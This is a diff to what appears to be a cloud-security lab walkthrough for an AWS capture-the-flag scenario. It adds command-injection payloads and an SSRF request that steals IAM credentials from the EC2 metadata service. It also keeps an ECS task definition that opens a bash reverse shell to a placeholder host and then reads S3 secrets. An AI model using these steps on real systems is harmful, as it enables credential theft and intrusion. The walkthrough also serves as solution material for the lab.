@@ -1,3 +1,34 @@
+# Easy Path
+
+Go to `http://<ec2_ip_address>`
+
+### Command Injection
+
+```
+; aws s3 ls
+; aws s3 ls s3://<bucket-name>/
+; aws s3 cp s3://<bucket-name>/flag.txt .
+; cat flag.txt
+```
+
+### SSRF
+```
+# SSRF Attack.
+http://<ec2_ip_address>/?url=http://[::ffff:a9fe:a9fe]/latest/meta-data/iam/security-credentials/<role>
+
+# Configure credentials.
+aws configure --profile attacker
+echo "aws_session_token = <token>" >> ~/.aws/credentials
+
+# Access to S3.
+aws s3 ls
+aws s3 ls s3://<bucket-name>/
+aws s3 cp s3://<bucket-name>/flag.txt .
+cat flag.txt
+```
+
+
+# Hard Path
 
 Go to `http://<ec2_ip_address>`
 
@@ -30,9 +61,9 @@ aws iam list-roles
 - more information about ecs
 
 ```
-`aws ecs list-clusters`
-`aws ecs describe-clusters --clusters <cluster>`
-`aws ecs list-container-instances --cluster arn:aws:ecs:us-east-1:<aws_id>:cluster/<cluster>`
+aws ecs list-clusters --region <region>
+aws ecs describe-clusters --region <region> --clusters <cluster>
+aws ecs list-container-instances --region <region> --cluster <cluster_arn>
 ```
 
 ### ECS Privesc
@@ -43,13 +74,13 @@ aws iam list-roles
 
 ```
 # ECS Task definition with revshell command.
-aws ecs register-task-definition --family iam_exfiltration --task-role-arn arn:aws:iam::<userr_id>:role/<role> --network-mode "awsvpc" --cpu 256 --memory 512 --requires-compatibilities "[\"FARGATE\"]" --container-definitions "[{\"name\":\"exfil_creds\",\"image\":\"python:latest\",\"entryPoint\":[\"sh\", \"-c\"],\"command\":[\"/bin/bash -c \\\"bash -i >& /dev/tcp/<revshell_ip>/4000 0>&1\\\"\"]}]"
+aws ecs register-task-definition --region <region> --family <task_name> --task-role-arn <task_role_arn> --network-mode "awsvpc" --cpu 256 --memory 512 --requires-compatibilities "[\"FARGATE\"]" --container-definitions "[{\"name\":\"exfil_creds\",\"image\":\"python:latest\",\"entryPoint\":[\"sh\", \"-c\"],\"command\":[\"/bin/bash -c \\\"bash -i >& /dev/tcp/<revshell_ip>/<revshell_port> 0>&1\\\"\"]}]"
 
 # For run-task, find available subnets.
-aws ec2 describe-subnets
+aws ec2 describe-subnets --region <region>
 
 # Run task.
-aws ecs run-task --task-definition iam_exfiltration --cluster arn:aws:ecs:us-east-1:<user_id>:cluster/<cluster> --launch-type FARGATE --network-configuration "{\"awsvpcConfiguration\":{\"assignPublicIp\": \"ENABLED\", \"subnets\":[\"<subnet>\"]}}"
+aws ecs run-task --region <region> --task-definition <task_name> --cluster <cluster_arn> --launch-type FARGATE --network-configuration "{\"awsvpcConfiguration\":{\"assignPublicIp\": \"ENABLED\", \"subnets\":[\"<subnet>\"]}}"
 ```
 After a few minutes, the revshell will be connected by container.
 Let's do it on revshell.
@@ -62,6 +93,6 @@ apt-get install awscli
 
 aws s3 ls
 aws s3 ls s3://<bucket-name>/
-aws s3 cp s3://<bucket-name>/flag.txt .
-cat flag.txt
+aws s3 cp s3://<bucket-name>/secret-string.txt .
+cat secret-string.txt
 ```
